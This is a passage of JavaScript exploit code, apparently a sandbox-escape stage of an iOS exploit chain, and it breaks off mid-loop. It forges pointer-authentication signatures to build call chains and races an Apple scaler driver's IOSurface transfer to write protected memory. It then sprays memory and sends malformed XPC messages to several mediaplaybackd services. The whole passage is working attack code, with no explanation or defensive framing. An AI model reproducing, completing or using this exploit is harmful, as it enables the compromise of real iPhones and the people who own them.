    stack.top = guard_page_right;
    stack.bottom = guard_page_left + 0x4000n;
    stack.start = 0n;
    stack.current = 0n;
    return stack;
  }
  function tcall_setup_control_stack(control_stack) {
    control_stack.start = control_stack.bottom + 0x4000n;
    control_stack.current = control_stack.start;
  }
  function tcall_setup_data_stack(data_stack) {
    data_stack.start = data_stack.top - 0x4000n;
    data_stack.current = data_stack.start;
  }
  function tcall_adjust_control_stack(control_stack) {
    const control_stack_adjustment = 0x30n;
    control_stack.start -= control_stack_adjustment;
    control_stack.current = control_stack.start;
  }
  function tcall_init_call(control_stack) {
    control_stack.current += 0x40n;
    uwrite64(control_stack.current + 64n, 0x42424242424242n);
    uwrite64(control_stack.current + 72n, pacib(0x42414241n, control_stack.current + 0x50n));
    control_stack.current += 0x50n;
    control_stack.start = control_stack.current;
  }
  function tcall_insert_call(control_stack, data_stack, last, address, x0, x1, x2, x3, x4, x5, x6, x7) {
    address = address.noPAC();
    let initial_control_stack = control_stack.start;
    if (last) {
      initial_control_stack -= 0x10n;
    }
    uwrite64(control_stack.current + 64n, pacia(tcall_DSSG, 0n));
    uwrite64(control_stack.current + 128n, control_stack.current + 32n);
    uwrite64(control_stack.current + 88n, 0n);
    uwrite64(control_stack.current + 104n, 0n);
    if (['b8', '731'].includes(get_ios_version())) {
      uwrite64(control_stack.current + 112n, pacia(tcall_CSSG, tcall_DG_return_context << 48n));
      uwrite64(control_stack.current + 120n, pacia(address, tcall_DG_call_context << 48n));
    } else {
      uwrite64(control_stack.current + 96n, pacia(tcall_CSSG, tcall_DG_return_context << 48n));
      uwrite64(control_stack.current + 112n, pacia(address, tcall_DG_call_context << 48n));
    }
    uwrite64(control_stack.current + 80n, data_stack.current);
    uwrite64(control_stack.current + 144n, 0x4141414141414141n);
    uwrite64(control_stack.current + 152n, pacib(tcall_X0LG, control_stack.current + 0xa0n));
    control_stack.current += 0xA0n;
    uwrite64(control_stack.current, 0x4141414141414141n);
    uwrite64(control_stack.current + 8n, pacib(tcall_RLG, control_stack.current + 0x10n));
    control_stack.current += 0x10n;
    control_stack.current += 0x40n;
    uwrite64(control_stack.current + 0n, x7);
    uwrite64(control_stack.current + 8n, x6);
    uwrite64(control_stack.current + 16n, x5);
    uwrite64(control_stack.current + 24n, x4);
    uwrite64(control_stack.current + 32n, x3);
    uwrite64(control_stack.current + 40n, x2);
    uwrite64(control_stack.current + 48n, x1);
    uwrite64(control_stack.current + 56n, x0);
    if (last) {
      uwrite64(control_stack.current + 64n, initial_control_stack);
    } else {
      uwrite64(control_stack.current + 64n, control_stack.current + 0x50n);
      ;
    }
    uwrite64(control_stack.current + 72n, pacib(tcall_DG, control_stack.current + 0x50n));
    control_stack.current += 0x50n;
    if (last) {
      uwrite64(initial_control_stack, 0x3535353535353535n);
      uwrite64(initial_control_stack + 8n, pacib(tcall_CRLG, initial_control_stack + 0x10n));
      ;
    } else {
      uwrite64(control_stack.current, 0x3535353535353535n);
      uwrite64(control_stack.current + 8n, pacib(tcall_CRLG, control_stack.current + 0x10n));
      ;
      control_stack.current += 0x10n;
    }
  }
  adjust_pivot_stack();
  let fcall_stack_sz = PAGE_SIZE * 0x40n;
  let surface_size = PAGE_SIZE * (8n + 1n) + fcall_stack_sz;
  let surface_address = 0n;
  let surface_address_remote = 0n;
  let tb = calloc(1n, 0x8n);
  mach_timebase_info(tb);
  let tb_numer = uread32(tb);
  let tb_denom = uread32(tb + 0x4n);
  let slide = get_shared_cache_slide();
  LOG(`SLIDE: ${slide.hex()}`);
  function user_slide(addr) {
    return addr + slide;
  }
  let SCALER_SERVICE_STRING = "AppleM2ScalerCSCDriver";
  let SCALER_TRANSFORM_METHOD_INDEX = 1n;
  let SCALER_TRANSFORM_ARGS_SIZE = 432n;
  function scaler_open_connection() {
    let kr = KERN_SUCCESS;
    let svc = 0n;
    svc = IOServiceGetMatchingService(kIOMainPortDefault(), IOServiceMatching(get_cstring(SCALER_SERVICE_STRING)));
    let connection_ptr = new_uint64_t();
    kr = IOServiceOpen(svc, mach_task_self(), 0n, connection_ptr);
    assert(kr == KERN_SUCCESS);
    let connection = uread32(connection_ptr);
    free(connection_ptr);
    return connection;
  }
  function scaler_create_surface_with_address(address, size) {
    let properties = CFDictionaryCreateMutable(kCFAllocatorDefault, 0n, kCFTypeDictionaryKeyCallBacks, kCFTypeDictionaryValueCallBacks);
    let address_ptr = new_uint64_t(address);
    let address_number = CFNumberCreate(kCFAllocatorDefault, 11n, address_ptr);
    CFDictionarySetValue(properties, create_cfstring(get_cstring("IOSurfaceAddress")), address_number);
    let size_ptr = new_uint64_t(size);
    let size_number = CFNumberCreate(kCFAllocatorDefault, 9n, size_ptr);
    CFDictionarySetValue(properties, create_cfstring(get_cstring("IOSurfaceAllocSize")), size_number);
    let width_ptr = new_uint64_t(1024n);
    let width_number = CFNumberCreate(0n, 9n, width_ptr);
    CFDictionarySetValue(properties, create_cfstring(get_cstring("IOSurfaceWidth")), width_number);
    let height_ptr = new_uint64_t(1040n);
    let height_number = CFNumberCreate(0n, 9n, height_ptr);
    CFDictionarySetValue(properties, create_cfstring(get_cstring("IOSurfaceHeight")), height_number);
    let pixel_format_ptr = new_uint64_t(0x4c353635n);
    let pixel_format_number = CFNumberCreate(0n, 9n, pixel_format_ptr);
    CFDictionarySetValue(properties, create_cfstring(get_cstring("IOSurfacePixelFormat")), pixel_format_number);
    let surface = IOSurfaceCreate(properties);
    free(address_ptr);
    free(size_ptr);
    free(width_ptr);
    free(height_ptr);
    free(pixel_format_ptr);
    CFRelease(address_number);
    CFRelease(size_number);
    CFRelease(width_number);
    CFRelease(height_number);
    CFRelease(pixel_format_number);
    CFRelease(properties);
    return surface;
  }
  function scaler_transfer(connection, source_surface, destination_surface) {
    let kr = KERN_SUCCESS;
    let args = calloc(1n, SCALER_TRANSFORM_ARGS_SIZE);
    uwrite64(args, IOSurfaceGetID(source_surface));
    uwrite64(args + 4n, IOSurfaceGetID(destination_surface));
    kr = IOConnectCallStructMethod(connection, SCALER_TRANSFORM_METHOD_INDEX, args, SCALER_TRANSFORM_ARGS_SIZE, 0n, 0n);
    assert(kr == KERN_SUCCESS, "Scaler transfer failed!");
    free(args);
    return kr;
  }
  let zero_filled_page = calloc(1n, PAGE_SIZE);
  function create_file_mapping(size) {
    assert(size % 0x4000n == 0);
    let tmp_path = calloc(1n, MAXPATHLEN);
    let tmp_path_len = confstr(_CS_DARWIN_USER_TEMP_DIR, tmp_path, MAXPATHLEN);
    assert(tmp_path_len != 0n, "Failed to get tmp dir");
    if (access(tmp_path, F_OK) == -1n) {
      res = mkdir(tmp_path, 0x1c0n);
      assert(res == 0n, "Failed to create tmp dir");
    }
    strlcat(tmp_path, get_cstring(tmp_path.hex()), MAXPATHLEN);
    let fd = open(tmp_path, O_CREAT | O_RDWR, 0x1b6n);
    assert(fd != -1n, "Failed to create tmp file");
    for (let i = 0n; i < size; i += PAGE_SIZE) {
      let w = pwrite(fd, zero_filled_page, PAGE_SIZE, i);
      assert(w == PAGE_SIZE, "Failed to write zero pages");
    }
    sync();
    let mapping = mmap(0n, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0n);
    assert(mapping != 0xffffffffffffffffn);
    let file_mapping = {};
    file_mapping.path = tmp_path;
    file_mapping.fd = fd;
    file_mapping.size = size;
    file_mapping.address = mapping;
    return file_mapping;
  }
  function destroy_file_mapping(file_mapping) {
    close(file_mapping.fd);
    munmap(file_mapping.address, file_mapping.size);
    remove(file_mapping.path);
  }
  let MAX_TRANSFER_BYTES = 1024n * 1024n;
  let SBX1SBX1_EXP_SIZE = 8n * PAGE_SIZE;
  let ORIGINAL_EXP_MARKER = 0x41n;
  let MODIFIED_EXP_MARKER = 0x42n;
  let n_of_race_attempts = 2048n;
  let scratch_buffer = calloc(1n, MAX_TRANSFER_BYTES);
  let exp_bypass_interval = 0n;
  let sbx1sbx1_interval = 0n;
  function insert_fcall(pthread_fcall_args, pc, x0, x1, x2, x3) {
    let args_array = uread64(pthread_fcall_args + 0x108n);
    let fcall_count = uread64(pthread_fcall_args + 0x110n);
    uwrite64(pthread_fcall_args + 0x110n, fcall_count + 1n);
    let buf = calloc(1n, 0x18n);
    uwrite64(buf, x0);
    uwrite64(buf + 0x10n, pacia(xpac(pc), 0n));
    let args_buf = args_array + fcall_count * 0x20n;
    uwrite64(args_buf + 0x00n, buf);
    uwrite64(args_buf + 0x08n, x1);
    uwrite64(args_buf + 0x10n, x2);
    uwrite64(args_buf + 0x18n, x3);
  }
  function get_ncpu() {
    let ncpu = calloc(1n, 8n);
    let ncpu_len = calloc(1n, 8n);
    uwrite64(ncpu_len, 4n);
    let ret = sysctlbyname(get_cstring("hw.ncpu"), ncpu, ncpu_len, 0n, 0n);
    assert(ret == 0n);
    ncpu = uread64(ncpu);
    return ncpu;
  }
  function thread_lock_lock(lock) {
    uwrite64(lock, 0x41n);
  }
  function thread_lock_unlock(lock) {
    uwrite64(lock, 0n);
    ulock_wake(UL_COMPARE_AND_WAIT | ULF_WAKE_ALL, lock, 0n);
  }
  function thread_group_lock(group, count) {
    for (let i = 0; i < count; i++) {
      if (i >= group.length) {
        break;
      }
      thread_lock_lock(group[i].lock);
    }
  }
  function thread_group_unlock(group, count) {
    for (let i = 0; i < count; i++) {
      if (i >= group.length) {
        break;
      }
      thread_lock_unlock(group[i].lock);
    }
  }
  function sbx1sbx1_exp_thread_setup(wait_lock, threads_ready_counter, threads_done_counter, source_address, source_size, destination_address) {
    let ret = 0n;
    let exp_interval = 500n;
    let rqtp = calloc(1n, 16n);
    uwrite64(rqtp + 8n, exp_interval);
    let control_stack_size = 8n * 0x4000n;
    let data_stack_size = 8n * 0x4000n;
    let control_stack = tcall_create_stack(control_stack_size);
    let data_stack = tcall_create_stack(data_stack_size);
    tcall_setup_control_stack(control_stack);
    tcall_setup_data_stack(data_stack);
    let attr = calloc(1n, 64n);
    ret = pthread_attr_init(attr);
    assert(ret == 0n);
    pthread_attr_setstacksize(attr, control_stack_size);
    pthread_attr_setstackaddr(attr, control_stack.current);
    tcall_adjust_control_stack(control_stack);
    tcall_init_call(control_stack);
    tcall_insert_call(control_stack, data_stack, false, func_resolve("OSAtomicIncrement32"), threads_ready_counter, 0n, 0n, 0n, 0n, 0n, 0n, 0n);
    tcall_insert_call(control_stack, data_stack, false, func_resolve("__ulock_wait"), UL_COMPARE_AND_WAIT, wait_lock, 0x41n, 0n, 0n, 0n, 0n, 0n);
    if (is_a12_devices) {
      tcall_insert_call(control_stack, data_stack, false, func_resolve("usleep"), 1n, 0n, 0n, 0n, 0n, 0n, 0n, 0n);
    } else {
      tcall_insert_call(control_stack, data_stack, false, func_resolve("nanosleep"), rqtp, 0n, 0n, 0n, 0n, 0n, 0n, 0n);
    }
    tcall_insert_call(control_stack, data_stack, false, func_resolve("mach_vm_copy"), mach_task_self(), source_address, source_size, destination_address, 0n, 0n, 0n, 0n);
    tcall_insert_call(control_stack, data_stack, true, func_resolve("OSAtomicIncrement32"), threads_done_counter, 0n, 0n, 0n, 0n, 0n, 0n, 0n);
    let thread = tcall_create_thread(attr);
    let t = {};
    t.thread = thread;
    t.lock = wait_lock;
    return t;
  }
  function sbx1sbx1_busy_thread_setup(wait_lock, threads_ready_counter, threads_done_counter, fd) {
    let ret = 0n;
    let control_stack_size = 8n * 0x4000n;
    let data_stack_size = 8n * 0x4000n;
    let control_stack = tcall_create_stack(control_stack_size);
    let data_stack = tcall_create_stack(data_stack_size);
    tcall_setup_control_stack(control_stack);
    tcall_setup_data_stack(data_stack);
    let attr = calloc(1n, 64n);
    ret = pthread_attr_init(attr);
    assert(ret == 0n);
    pthread_attr_setstacksize(attr, control_stack_size);
    pthread_attr_setstackaddr(attr, control_stack.current);
    tcall_adjust_control_stack(control_stack);
    tcall_init_call(control_stack);
    tcall_insert_call(control_stack, data_stack, false, func_resolve("OSAtomicIncrement32"), threads_ready_counter, 0n, 0n, 0n, 0n, 0n, 0n, 0n);
    tcall_insert_call(control_stack, data_stack, false, func_resolve("__ulock_wait"), UL_COMPARE_AND_WAIT, wait_lock, 0x41n, 0n, 0n, 0n, 0n, 0n);
    tcall_insert_call(control_stack, data_stack, false, func_resolve("pread"), fd, scratch_buffer, MAX_TRANSFER_BYTES, 0n, 0n, 0n, 0n, 0n);
    tcall_insert_call(control_stack, data_stack, true, func_resolve("OSAtomicIncrement32"), threads_done_counter, 0n, 0n, 0n, 0n, 0n, 0n, 0n);
    let thread = tcall_create_thread(attr);
    let t = {};
    t.thread = thread;
    t.lock = wait_lock;
    return t;
  }
  function sbx1sbx1_exp(size) {
    if (size != SBX1SBX1_EXP_SIZE) {
      LOG("[x] Error: EXP mapping length must match hardcoded size, for now.");
      return undefined;
    }
    let sbx1sbx1_ctx = {};
    let scaler_connection = scaler_open_connection();
    assert(scaler_connection != 0n);
    let target_surface_size = MAX_TRANSFER_BYTES + SBX1SBX1_EXP_SIZE;
    let target_surface_address = 0n;
    let target_fm = create_file_mapping(target_surface_size);
    target_surface_address = target_fm.address;
    memset(target_surface_address, 0n, target_surface_size);
    let source_surface_size = target_surface_size;
    let source_surface_address = 0n;
    let source_surface_address_ptr = new_uint64_t(source_surface_address);
    kr = mach_vm_allocate(mach_task_self(), source_surface_address_ptr, source_surface_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
    assert(kr == KERN_SUCCESS);
    source_surface_address = uread64(source_surface_address_ptr);
    free(source_surface_address_ptr);
    memset(source_surface_address, MODIFIED_EXP_MARKER, source_surface_size);
    let target_surface = 0n;
    let source_surface = scaler_create_surface_with_address(source_surface_address, source_surface_size);
    assert(source_surface != 0n);
    let threads_ready_counter = calloc(1n, 8n);
    let threads_done_counter = calloc(1n, 8n);
    let race_thread_lock = calloc(1n, 8n);
    thread_lock_lock(race_thread_lock);
    let read_size = SBX1SBX1_EXP_SIZE;
    let read_address_ptr = new_uint64_t();
    kr = mach_vm_allocate(mach_task_self(), read_address_ptr, read_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
    assert(kr == KERN_SUCCESS);
    let read_address = uread64(read_address_ptr);
    let exp_thread = sbx1sbx1_exp_thread_setup(race_thread_lock, threads_ready_counter, threads_done_counter, target_surface_address + MAX_TRANSFER_BYTES, read_size, read_address);
    let busy_thread = sbx1sbx1_busy_thread_setup(race_thread_lock, threads_ready_counter, threads_done_counter, target_fm.fd);
    r = pread(target_fm.fd, scratch_buffer, MAX_TRANSFER_BYTES, 0n);
    assert(r == MAX_TRANSFER_BYTES);
    let won = false;
    exp_bypass_interval = Date.now();
    LOG("Before searching loop");
    for (let attempt = 0; attempt < n_of_race_attempts; attempt++) {
      target_surface = scaler_create_surface_with_address(target_surface_address, target_surface_size);
      assert(target_surface != 0n);
      memset(target_surface_address, ORIGINAL_EXP_MARKER, target_surface_size);
      kr = mach_vm_deallocate(mach_task_self(), read_address, read_size);
      assert(kr == KERN_SUCCESS);
      kr = mach_vm_allocate(mach_task_self(), read_address_ptr, read_size, VM_FLAGS_FIXED);
      assert(kr == KERN_SUCCESS);
      let r = 0n;
      pthread_yield_np(pthread_self());
      if(!cmp8_wait_for_value(threads_ready_counter, 2))
        return sbx1sbx1_exp(size);
      uwrite64(threads_ready_counter, 0n);
      ulock_wake(UL_COMPARE_AND_WAIT | ULF_WAKE_ALL, race_thread_lock, 0n);
      IOSurfacePrefetchPages(target_surface);
      if(!cmp8_wait_for_value(threads_done_counter, 2))
        return sbx1sbx1_exp(size);
      uwrite64(threads_done_counter, 0n);
      kr = scaler_transfer(scaler_connection, source_surface, target_surface);
      r = uread64(read_address);
      if (r != 0x4141414141414141n) {
        exp_bypass_interval = Date.now() - exp_bypass_interval;
        LOG(`Got it: (${attempt}) ${r.hex()}`);
        won = true;
        break;
      }
      CFRelease(target_surface);
    }
    if (won == false) {
      LOG("[x] Failed to create writable EXP memory!");
      IOServiceClose(scaler_connection);
      destroy_file_mapping(target_fm);
      kr = mach_vm_deallocate(mach_task_self(), read_address, read_size);
      assert(kr == KERN_SUCCESS, "Failed to deallocate EXP mapping!");
      kr = mach_vm_deallocate(mach_task_self(), source_surface_address, source_surface_size);
      assert(kr == KERN_SUCCESS, "Failed to deallocate source surface mapping!");
      CFRelease(source_surface);
      return undefined;
    }
    sbx1sbx1_ctx.connection = scaler_connection;
    sbx1sbx1_ctx.source_surface = source_surface;
    sbx1sbx1_ctx.source_surface_address = source_surface_address;
    sbx1sbx1_ctx.source_surface_size = source_surface_size;
    sbx1sbx1_ctx.destination_surface = target_surface;
    sbx1sbx1_ctx.destination_surface_address = target_surface_address;
    sbx1sbx1_ctx.destination_surface_size = target_surface_size;
    return sbx1sbx1_ctx;
  }
  function sbx1sbx1_exp_scratch_reset(ctx) {
    memset(ctx.source_surface_address, 0n, ctx.source_surface_size);
  }
  function sbx1sbx1_exp_write_prepare(ctx, buffer, size) {
    if (size > SBX1SBX1_EXP_SIZE) {
      LOG(`[x] Error: Requested size (${size.hex()}) is larger than EXP size: ${SBX1SBX1_EXP_SIZE}`);
      return;
    }
    let source_address = ctx.source_surface_address + MAX_TRANSFER_BYTES;
    memcpy(source_address, buffer, size);
  }
  function sbx1sbx1_exp_write_perform(ctx) {
    let kr = KERN_SUCCESS;
    kr = scaler_transfer(ctx.connection, ctx.source_surface, ctx.destination_surface);
    return kr;
  }
  function sbx1sbx1_exp_write_prepare_and_perform(ctx, buffer, size) {
    sbx1sbx1_exp_write_prepare(ctx, buffer, size);
    sbx1sbx1_exp_write_perform(ctx);
  }
  function sbx1sbx1_exp_write_thread_setup(ctx, buffer_size, original_buffer, modified_buffer, target_offset) {
    let ret = 0n;
    let lock = calloc(1n, 8n);
    uwrite64(lock, 0x41n);
    let transform_args = calloc(1n, SCALER_TRANSFORM_ARGS_SIZE);
    uwrite64(transform_args, IOSurfaceGetID(ctx.source_surface));
    uwrite64(transform_args + 4n, IOSurfaceGetID(ctx.destination_surface));
    let transform_ctx = calloc(1n, 64n);
    uwrite64(transform_ctx + 36n, ctx.connection);
    let control_stack_size = 8n * 0x4000n;
    let data_stack_size = 8n * 0x4000n;
    let control_stack = tcall_create_stack(control_stack_size);
    let data_stack = tcall_create_stack(data_stack_size);
    tcall_setup_control_stack(control_stack);
    tcall_setup_data_stack(data_stack);
    let counter_ptr = calloc(1n, 8n);
    let attr = calloc(1n, 64n);
    ret = pthread_attr_init(attr);
    assert(ret == 0n);
    pthread_attr_setstacksize(attr, control_stack_size);
    pthread_attr_setstackaddr(attr, control_stack.current);
    tcall_adjust_control_stack(control_stack);
    tcall_init_call(control_stack);
    tcall_insert_call(control_stack, data_stack, false, func_resolve("__ulock_wait"), UL_COMPARE_AND_WAIT, lock, 0x41n, 0n, 0n, 0n, 0n, 0n);
    tcall_insert_call(control_stack, data_stack, false, func_resolve("memcpy"), ctx.source_surface_address + MAX_TRANSFER_BYTES + target_offset, modified_buffer, buffer_size, 0n, 0n, 0n, 0n, 0n);
    tcall_insert_call(control_stack, data_stack, false, transformSurface_gadget, transform_ctx, transform_args, 0n, 0n, 0n, 0n, 0n, 0n);
    tcall_insert_call(control_stack, data_stack, false, func_resolve("memcpy"), ctx.source_surface_address + MAX_TRANSFER_BYTES + target_offset, original_buffer, buffer_size, 0n, 0n, 0n, 0n, 0n);
    tcall_insert_call(control_stack, data_stack, true, transformSurface_gadget, transform_ctx, transform_args, 0n, 0n, 0n, 0n, 0n, 0n);
    let thread = tcall_create_thread(attr);
    set_realtime_priority(thread, 0, 50, 50);
    let t = {};
    t.thread = thread;
    t.lock = lock;
    return t;
  }
  function test_msg_create(connection) {
    let o = oxpc_dictionary_alloc();
    let null_o = oxpc_null_alloc();
    oxpc_dictionary_append(o, xpc_string_create("test"), null_o);
    let payload = oxpc_object_serialize_with_header(o);
    let port_list = payload["ports"];
    let serialized_payload_size = payload["total_size"];
    let serialized_payload = payload["buffer"];
    let port_ptr = new_uint64_t();
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, port_ptr);
    let port = uread32(port_ptr);
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    oxpc_port_list_append(port_list, port);
    let message = oxpc_build_mach_message(serialized_payload, serialized_payload_size, 1n, port_list, connection["client_port"], connection["reply_port"]);
    let xpc_msg_size = message["message_size"];
    let xpc_msg = message["message"];
    let msg = {};
    msg.msg = xpc_msg;
    msg.msg_size = xpc_msg_size;
    return msg;
  }
  function set_realtime_priority_us(thread, period_us, computation_us, constraint_us) {
    let clock2abs_us = Number(tb_denom) / Number(tb_numer) * 1000;
    let policy = gpu_fcall(CALLOC, 1n, 32n);
    uwrite64(policy + 0n, BigInt(period_us * clock2abs_us));
    uwrite64(policy + 4n, BigInt(computation_us * clock2abs_us));
    uwrite64(policy + 8n, BigInt(constraint_us * clock2abs_us));
    let mach_thread = gpu_fcall(PTHREAD_MACH_THREAD_NP, thread);
    let kret = gpu_fcall(THREAD_POLICY_SET, mach_thread, 2n, policy, 4n);
    assert(kret == 0n);
  }
  function set_realtime_priority(thread, period_ms, computation_ms, constraint_ms) {
    let clock2abs_ms = Number(tb_denom) / Number(tb_numer) * 1000000;
    let policy = gpu_fcall(CALLOC, 1n, 32n);
    uwrite64(policy + 0n, BigInt(period_ms * clock2abs_ms));
    uwrite64(policy + 4n, BigInt(computation_ms * clock2abs_ms));
    uwrite64(policy + 8n, BigInt(constraint_ms * clock2abs_ms));
    let mach_thread = gpu_fcall(PTHREAD_MACH_THREAD_NP, thread);
    let kret = gpu_fcall(THREAD_POLICY_SET, mach_thread, 2n, policy, 4n);
    assert(kret == 0n);
  }
  let is_a12_devices = false;
  function wc_calloc(n, sz) {
    return wc_fcall(xpac(func_resolve("calloc")), n, sz);
  }
  function wc_strcmp(s1, s2) {
    return wc_fcall(xpac(func_resolve("strcmp")), s1, s2);
  }
  function wc_strstr(s1, s2) {
    return wc_fcall(xpac(func_resolve("strstr")), s1, s2);
  }
  function wc_get_device_machine() {
    let utsname = wc_calloc(256n, 5n);
    wc_fcall(xpac(func_resolve("uname")), utsname);
    return utsname + 256n * 4n;
  }
  let device_machine = wc_get_device_machine();
  function sbx1sbx1() {
    let kr = KERN_SUCCESS;
    LOG("Sbx1 starting...");
    if (wc_strstr(device_machine, wc_get_cstring("iPhone11,")) != 0n) {
      is_a12_devices = true;
      LOG("Running on A12 Devices");
    } else {
      is_a12_devices = false;
      LOG("Running on non-A12 Devices");
    }
    let surface = create_iosurface(surface_size);
    let spray_memory_object = setup_guess_address(surface);
    let sbx1sbx1_ctx = sbx1sbx1_exp(SBX1SBX1_EXP_SIZE);
    LOG(`connection: ${sbx1sbx1_ctx.connection.hex()}`);
    LOG(`source_surface: ${sbx1sbx1_ctx.source_surface.hex()}`);
    LOG(`source_surface_address: ${sbx1sbx1_ctx.source_surface_address.hex()}`);
    LOG(`source_surface_size: ${sbx1sbx1_ctx.source_surface_size.hex()}`);
    LOG(`destination_surface: ${sbx1sbx1_ctx.destination_surface.hex()}`);
    LOG(`destination_surface_address: ${sbx1sbx1_ctx.destination_surface_address.hex()}`);
    LOG(`destination_surface_size: ${sbx1sbx1_ctx.destination_surface_size.hex()}`);
    let test = calloc(1n, 8n);
    uwrite64(test, 0xbabababababababan);
    sbx1sbx1_exp_write_prepare(sbx1sbx1_ctx, test, 8n);
    sbx1sbx1_exp_write_perform(sbx1sbx1_ctx);
    let key_hdr_sz = 0x28n;
    let big_key_size = PAGE_SIZE * 8n - key_hdr_sz;
    let small_key_size = PAGE_SIZE * 4n - key_hdr_sz;
    let random_key_size = PAGE_SIZE * 1n - key_hdr_sz;
    let big_key = calloc(1n, big_key_size);
    let small_key = calloc(1n, small_key_size);
    let random_key = calloc(1n, random_key_size);
    memset(big_key, 0x41n, big_key_size - 1n);
    memset(small_key, 0x42n, small_key_size - 1n);
    memset(random_key, 0x43n, random_key_size - 1n);
    let o = oxpc_dictionary_alloc();
    let null_o = oxpc_null_alloc();
    oxpc_dictionary_append(o, big_key, null_o);
    uwrite8(big_key, uread8(big_key) + 0x1);
    for (let i = 0n; i < 4n; i++) {
      oxpc_dictionary_append(o, small_key, null_o);
      uwrite8(small_key, uread8(small_key) + 0x1);
    }
    oxpc_dictionary_append(o, big_key, null_o);
    oxpc_dictionary_append(o, random_key, null_o);
    free(big_key);
    free(small_key);
    free(random_key);
    let port_ptr = new_uint64_t();
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, port_ptr);
    let port = uread32(port_ptr);
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    let payload = oxpc_object_serialize_with_header(o);
    let port_list = payload["ports"];
    let serialized_payload_size = payload["total_size"];
    let serialized_payload = payload["buffer"];
    oxpc_port_list_append(port_list, port);
    let magic_ptr = new_uint64_t(0x41414142n);
    let start_of_target_string = memmem(serialized_payload, serialized_payload_size, magic_ptr, 0x4n);
    assert(start_of_target_string != NULL, "Failed to find target string");
    uwrite8(start_of_target_string, 0x41);
    let end_of_target_string = start_of_target_string + big_key_size;
    let end_of_target_string_page = trunc_page(end_of_target_string);
    let ool_string_offset = start_of_target_string - serialized_payload;
    let target_offset = end_of_target_string - end_of_target_string_page - 1n;
    LOG("end_of_target_string_page: " + end_of_target_string_page.hex());
    LOG("target_offset: " + target_offset.hex());
    let original_ool_page = calloc(1n, PAGE_SIZE);
    memcpy(original_ool_page, end_of_target_string_page, PAGE_SIZE);
    let tmp_ptr = new_uint64_t(end_of_target_string_page);
    let cur_protection_ptr = new_uint64_t(VM_PROT_DEFAULT);
    let max_protection_ptr = new_uint64_t(VM_PROT_DEFAULT);
    kr = mach_vm_remap(mach_task_self(), tmp_ptr, PAGE_SIZE, 0n, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, mach_task_self(), sbx1sbx1_ctx.destination_surface_address + MAX_TRANSFER_BYTES, 1n, cur_protection_ptr, max_protection_ptr, VM_INHERIT_NONE);
    assert(kr == KERN_SUCCESS);
    sbx1sbx1_exp_write_prepare_and_perform(sbx1sbx1_ctx, original_ool_page, PAGE_SIZE);
    let buffer_size = 16n + 1n;
    let original_buffer = calloc(1n, buffer_size);
    memcpy(original_buffer, original_ool_page + target_offset, buffer_size);
    let modified_buffer = calloc(1n, buffer_size);
    uwrite8(modified_buffer, 0x41);
    uwrite64(modified_buffer + 1n, 0xbabababababababan);
    let n_of_current_exp_write_threads = 1n;
    let n_of_exp_write_threads = get_ncpu();
    let exp_write_threads = [];
    LOG(`Using ${n_of_exp_write_threads} EXP target threads for this configuration.`);
    for (let i = 0n; i < n_of_exp_write_threads; i++) {
      exp_write_threads[i] = sbx1sbx1_exp_write_thread_setup(sbx1sbx1_ctx, buffer_size, original_buffer, modified_buffer, target_offset);
    }
    let success = false;
    let services = ["com.apple.coremedia.mediaplaybackd.asset.xpc", "com.apple.coremedia.mediaplaybackd.assetimagegenerator.xpc", "com.apple.coremedia.mediaplaybackd.cpe.xpc", "com.apple.coremedia.mediaplaybackd.cpeprotector.xpc", "com.apple.coremedia.mediaplaybackd.figcontentkeyboss.xpc", "com.apple.coremedia.mediaplaybackd.figcontentkeysession.xpc", "com.apple.coremedia.mediaplaybackd.figcpecryptor.xpc", "com.apple.coremedia.mediaplaybackd.figmetriceventtimeline.xpc", "com.apple.coremedia.mediaplaybackd.formatreader.xpc", "com.apple.coremedia.mediaplaybackd.visualcontext.xpc"];
    let services_idx = 0n;
    set_realtime_priority(gpu_fcall(PTHREAD_SELF), 0, 50, 50);
    pthread_yield_np(pthread_self());
    for (let attempt = 0n; attempt < 8n; attempt++) {
      if (services_idx >= services.length) {
        break;
      }
      let TARGET_XPC_SERVICE = services[services_idx];
      let connection = xpcjs_xpc_connect(TARGET_XPC_SERVICE);
      if (connection == null) {
        LOG(`connection failed, retrying again with a different endpoint...`);
        continue;
      }
      LOG(`connected to ${TARGET_XPC_SERVICE}`);
      LOG(`connection client_port: ${connection["client_port"].hex()}`);
      LOG(`connection reply_port: ${connection["reply_port"].hex()}`);
      let test_msg = test_msg_create(connection);
      let message = oxpc_build_mach_message(serialized_payload, serialized_payload_size, 1n, port_list, connection["client_port"], connection["reply_port"]);
      let xpc_msg_size = message["message_size"];
      let xpc_msg = message["message"];
      let mach_msg_option = MACH_SEND_MSG | MACH_SEND_TIMEOUT;
      let mach_msg_send_size = xpc_msg_size;
      let mach_msg_rcv_size = xpc_msg_size + PAGE_SIZE;
      let mach_msg_rcv_name = connection["reply_port"];
      spray_guess_address(spray_memory_object, surface);
      uwrite64(modified_buffer + 1n + 8n, guess_address + 0x110n);
      let n_of_max_exp_attempts = 8192n;
      let yield_threshold = 256n;
      for (let exp_attempt = 0n; exp_attempt < n_of_max_exp_attempts; exp_attempt++) {
        thread_group_unlock(exp_write_threads, n_of_current_exp_write_threads);
        kr = mach_msg(xpc_msg, mach_msg_option, mach_msg_send_size, 0n, 0n, 15n, MACH_PORT_NULL);
        if (kr != MACH_SEND_TIMED_OUT) {
          if (kr != KERN_SUCCESS) {
            LOG(`[!] Unexpected return code from mach_msg: ${kr.hex()} for exp_attempt: ${exp_attempt}, retrying...`);
            services_idx++;
            thread_group_lock(exp_write_threads, n_of_current_exp_write_threads);
            break;
          }
          if (exp_attempt != 0n && exp_attempt % yield_threshold == 0n) {
            thread_group_lock(exp_write_threads, n_of_current_exp_write_threads);
            LOG("Yielding...");
            pthread_yield_np(pthread_self());
            thread_group_unlock(exp_write_threads, n_of_current_exp_write_threads);
          }
          if (exp_attempt > n_of_max_exp_attempts - 32n) {
            LOG(`too many attempts, exp_attempt: ${exp_attempt}...`);
            thread_group_lock(exp_write_threads, n_of_current_exp_write_threads);
            return false;
          }
